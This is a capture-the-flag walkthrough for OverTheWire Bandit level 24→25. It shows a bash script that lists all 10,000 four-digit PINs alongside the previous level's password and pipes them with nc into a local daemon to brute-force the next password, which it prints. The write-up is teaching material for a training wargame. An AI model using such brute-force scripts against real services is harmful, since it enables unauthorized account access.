# Bandit Level 24 → Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution

* Step1

  ```shell
  ./bandit_login.sh bandit24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
  ```

* Step2

  ```shell
  bandit24@bandit:~$ vi /tmp/generate_passdict.sh
  
  #!/bin/bash
  rm -rf /tmp/passdict.txt
  pass='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
  for i in `seq 0 9999`
  do
    printf "%s %04d\n" $pass $i >> /tmp/passdict.txt
  done
  echo "generate passdict.txt done"
  ```

* Step3

  ```shell
  bandit24@bandit:~$ sh /tmp/generate_passdict.sh
  generate passdict.txt done
  ```

* Step4

  ```shell
  bandit24@bandit:~$ cat /tmp/passdict.txt | nc localhost 30002 | tail -n 3 | head -n 1
  The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
  ```

  